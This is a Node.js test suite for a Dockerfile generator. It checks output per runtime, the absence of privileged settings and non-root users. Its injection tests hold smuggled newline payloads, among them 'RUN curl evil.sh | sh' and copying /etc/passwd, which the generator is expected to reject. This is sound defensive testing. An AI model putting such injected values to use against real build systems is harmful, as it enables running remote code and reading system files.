import assert from 'node:assert/strict';
import { describe, it } from 'node:test';

// Set env vars so the module loads cleanly
process.env.GITHUB_APP_ID = '12345';
process.env.GITHUB_APP_NAME = 'test-app';

const { generateDockerfile } =
  await import('../../apps/worker/src/deployment/dockerfile-generator.js');

describe('generateDockerfile — STATIC', () => {
  it('uses nginx and copies . to html dir', () => {
    const df = generateDockerfile({
      runtimeType: 'STATIC',
      buildCommand: null,
      startCommand: null,
      outputDirectory: null,
      applicationPort: null,
    });
    assert.ok(df.includes('FROM nginx'));
    assert.ok(df.includes('COPY . /usr/share/nginx/html'));
    assert.ok(!df.includes('npm'));
  });
});

describe('generateDockerfile — REACT', () => {
  it('uses multi-stage build with nginx output', () => {
    const df = generateDockerfile({
      runtimeType: 'REACT',
      buildCommand: 'npm run build',
      startCommand: null,
      outputDirectory: 'dist',
      applicationPort: null,
    });
    assert.ok(df.includes('AS builder'));
    assert.ok(df.includes('FROM nginx'));
    assert.ok(df.includes('npm run build'));
    assert.ok(df.includes('/app/dist /usr/share/nginx/html'));
  });
  it('defaults outputDirectory to dist when null', () => {
    const df = generateDockerfile({
      runtimeType: 'REACT',
      buildCommand: 'npm run build',
      startCommand: null,
      outputDirectory: null,
      applicationPort: null,
    });
    assert.ok(df.includes('/app/dist'));
  });
});

describe('generateDockerfile — VUE', () => {
  it('uses multi-stage build identical to REACT', () => {
    const df = generateDockerfile({
      runtimeType: 'VUE',
      buildCommand: 'npm run build',
      startCommand: null,
      outputDirectory: 'dist',
      applicationPort: null,
    });
    assert.ok(df.includes('AS builder'));
    assert.ok(df.includes('nginx'));
  });
});

describe('generateDockerfile — NEXTJS', () => {
  it('uses three-stage build with standalone output', () => {
    const df = generateDockerfile({
      runtimeType: 'NEXTJS',
      buildCommand: 'npm run build',
      startCommand: null,
      outputDirectory: '.next',
      applicationPort: null,
    });
    assert.ok(df.includes('AS deps'));
    assert.ok(df.includes('AS builder'));
    assert.ok(df.includes('standalone'));
    assert.ok(df.includes('EXPOSE 3000'));
  });
});

describe('generateDockerfile — EXPRESS', () => {
  it('uses node:22-alpine base with port exposure', () => {
    const df = generateDockerfile({
      runtimeType: 'EXPRESS',
      buildCommand: null,
      startCommand: 'node server.js',
      outputDirectory: null,
      applicationPort: 3000,
    });
    assert.ok(df.includes('FROM node:22-alpine'));
    assert.ok(df.includes('EXPOSE 3000'));
    assert.ok(df.includes('npm ci'));
    // Ensure CMD is JSON array format (not shell string)
    assert.ok(df.includes('"node"') && df.includes('"server.js"') && df.includes('CMD ['));
  });
  it('generates valid CMD array for npm start', () => {
    const df = generateDockerfile({
      runtimeType: 'EXPRESS',
      buildCommand: null,
      startCommand: 'npm start',
      outputDirectory: null,
      applicationPort: 8080,
    });
    assert.ok(df.includes('"npm"') && df.includes('"start"') && df.includes('CMD ['));
    assert.ok(df.includes('EXPOSE 8080'));
  });
});

describe('generateDockerfile — NODEJS', () => {
  it('same as EXPRESS', () => {
    const df = generateDockerfile({
      runtimeType: 'NODEJS',
      buildCommand: null,
      startCommand: 'node index.js',
      outputDirectory: null,
      applicationPort: 3000,
    });
    assert.ok(df.includes('"node"') && df.includes('"index.js"') && df.includes('CMD ['));
  });
});

describe('generateDockerfile — UNKNOWN', () => {
  it('throws for unsupported runtime', () => {
    assert.throws(
      () =>
        generateDockerfile({
          runtimeType: 'UNKNOWN',
          buildCommand: null,
          startCommand: null,
          outputDirectory: null,
          applicationPort: null,
        }),
      /unsupported runtime/i,
    );
  });
});

describe('generateDockerfile — security', () => {
  it('never includes sudo or privileged directives', () => {
    for (const runtimeType of ['STATIC', 'REACT', 'EXPRESS', 'NEXTJS']) {
      const cfg = {
        runtimeType,
        buildCommand: 'npm run build',
        startCommand: 'node server.js',
        outputDirectory: 'dist',
        applicationPort: 3000,
      };
      const df = generateDockerfile(cfg);
      assert.ok(!df.includes('--privileged'), `${runtimeType} Dockerfile must not be privileged`);
      assert.ok(!df.includes('sudo'), `${runtimeType} Dockerfile must not use sudo`);
    }
  });

  it('does not expose Docker socket', () => {
    for (const runtimeType of ['STATIC', 'REACT', 'EXPRESS']) {
      const cfg = {
        runtimeType,
        buildCommand: null,
        startCommand: 'node app.js',
        outputDirectory: 'dist',
        applicationPort: 3000,
      };
      const df = generateDockerfile(cfg);
      assert.ok(
        !df.includes('/var/run/docker.sock'),
        `${runtimeType} must not mount Docker socket`,
      );
    }
  });

  // Independent re-check ahead of the web form validator (project.validator.js):
  // a newline in buildCommand/startCommand/outputDirectory would inject
  // arbitrary Dockerfile directives via RUN/CMD/COPY interpolation.
  it('rejects a buildCommand containing a newline', () => {
    assert.throws(
      () =>
        generateDockerfile({
          runtimeType: 'REACT',
          buildCommand: 'npm run build\nUSER root',
          startCommand: null,
          outputDirectory: 'dist',
          applicationPort: null,
        }),
      /control character/,
    );
  });

  it('rejects a startCommand containing a newline', () => {
    assert.throws(
      () =>
        generateDockerfile({
          runtimeType: 'NODEJS',
          buildCommand: null,
          startCommand: 'node server.js\nRUN curl evil.sh | sh',
          outputDirectory: null,
          applicationPort: 3000,
        }),
      /control character/,
    );
  });

  it('rejects an outputDirectory containing a newline', () => {
    assert.throws(
      () =>
        generateDockerfile({
          runtimeType: 'REACT',
          buildCommand: 'npm run build',
          startCommand: null,
          outputDirectory: 'dist\nCOPY /etc/passwd /app/passwd',
          applicationPort: null,
        }),
      /control character/,
    );
  });
});

describe('generateDockerfile — non-root runtime user', () => {
  const baseCfg = {
    buildCommand: 'npm run build',
    startCommand: 'node server.js',
    outputDirectory: 'dist',
    applicationPort: 3000,
  };

  it('static runtimes use the unprivileged nginx image on port 8080, never 80', () => {
    for (const runtimeType of ['STATIC', 'REACT', 'VUE']) {
      const df = generateDockerfile({ ...baseCfg, runtimeType });
      assert.ok(
        df.includes('FROM nginxinc/nginx-unprivileged'),
        `${runtimeType} must use the unprivileged nginx image`,
      );
      assert.ok(df.includes('EXPOSE 8080'), `${runtimeType} must expose 8080`);
      assert.ok(!/EXPOSE 80\b(?!\d)/.test(df), `${runtimeType} must not expose port 80`);
    }
  });

  it('node runtimes drop to the node user before CMD', () => {
    for (const runtimeType of ['EXPRESS', 'NODEJS', 'NEXTJS']) {
      const df = generateDockerfile({ ...baseCfg, runtimeType });
      const userIndex = df.indexOf('USER node');
      const cmdIndex = df.indexOf('CMD ');
      assert.ok(userIndex !== -1, `${runtimeType} must set USER node`);
      assert.ok(userIndex < cmdIndex, `${runtimeType} must set USER node before CMD`);
    }
  });

  it('node runtimes copy app files owned by the node user', () => {
    for (const runtimeType of ['EXPRESS', 'NODEJS', 'NEXTJS']) {
      const df = generateDockerfile({ ...baseCfg, runtimeType });
      assert.ok(
        df.includes('--chown=node:node'),
        `${runtimeType} must chown app files to node so runtime writes work`,
      );
    }
  });
});
